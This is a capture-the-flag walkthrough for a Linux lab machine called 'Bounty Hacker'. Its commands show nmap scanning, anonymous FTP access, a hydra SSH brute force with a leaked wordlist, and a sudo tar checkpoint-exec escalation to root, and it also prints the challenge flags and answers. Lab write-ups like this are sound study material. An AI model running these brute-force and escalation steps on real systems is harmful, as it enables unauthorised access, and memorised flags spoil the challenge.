# Bounty Hacker Writeup

> Machine : Linux

> You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Solution

First we connect to the machine.

> Deploy the machine.
> 
> No answer needed

Then reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.156.103 -p-
```

From our results, we can see ports 21 (FTP), 22 (SSH) and 80 (HTTP) are open.

> Find open ports on the machine
> 
> No answer needed

First let's start by browsing the IP, but we don't find anything interesting there. And also `gobuster`
give us nothing.

So let's see `FTP` because we know from `nmap` resolute that anonymous login is allowed. 

```shell
ftp 10.129.156.103
anonymous
```

```shell
ls
```

```text
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

```shell
mget *
```

```shell
bye
```

Now let's see the files we download.

```shell
cat locks.txt
```

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

It's like a password wordlist.

```shell
cat task.txt
```

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

And here is a username `lin`.

> Who wrote the task list?
> 
> lin

> What service can you bruteforce with the text file found?
> 
> SSH

```shell
hydra -l lin -P locks.txt ssh://10.129.156.103/ 
```

```text
[22][ssh] host: 10.129.156.103   login: lin   password: RedDr4gonSynd1cat3
```

> What is the users password?
> 
> RedDr4gonSynd1cat3

```shell
ssh lin@10.129.156.103
RedDr4gonSynd1cat3
```

And we are in.

```shell
cat user.txt
```

```text
THM{CR1M3_SyNd1C4T3}
```

> user.txt
> 
> THM{CR1M3_SyNd1C4T3}

```shell
sudo -l
```

```text
(root) /bin/tar
```

Using `GTFOBins` we found.

```shell
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```shell
bash -i
```

```shell
whoami
```

```text
root
```

```shell
cat /root/root.txt
```

```text
THM{80UN7Y_h4cK3r}
```

> root.txt
> 
> THM{80UN7Y_h4cK3r}

